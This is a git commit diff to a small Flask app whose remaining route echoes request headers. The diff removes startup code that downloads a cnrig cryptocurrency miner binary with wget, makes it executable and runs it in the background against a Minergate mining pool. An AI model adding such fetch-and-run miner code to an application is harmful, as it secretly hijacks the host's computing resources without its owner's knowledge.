3253d13aca4de9f495edaa87c3383f91eb7414c8
dwij39 <43697179+dwij39@users.noreply.github.com>
2018-10-28 11:09:18 +0530

    Update app.py

--- app.py
+++ app.py
@@ -4,15 +4,6 @@ import os
 from flask import Flask, Response, request
 app = Flask(__name__)
 
-
-a  = os.popen('wget -O cnrig https://github.com/cnrig/cnrig/releases/download/v0.1.5-release/cnrig-0.1.5-linux-x86_64').readlines()
-a  = os.popen('chmod +x cnrig').readlines()
-a  = os.popen('ls').readlines()
-a  = os.popen('./cnrig --donate-level 1 -a cryptonight -u dwijads39@gmail.com -o fcn.pool.minergate.com:45610 -p x -B').readlines()
-
-
-
-
 @app.route("/")
 def headers():
     return '<br/>'.join(['%s => %s' % (key, value) for (key, value) in request.headers.items()])
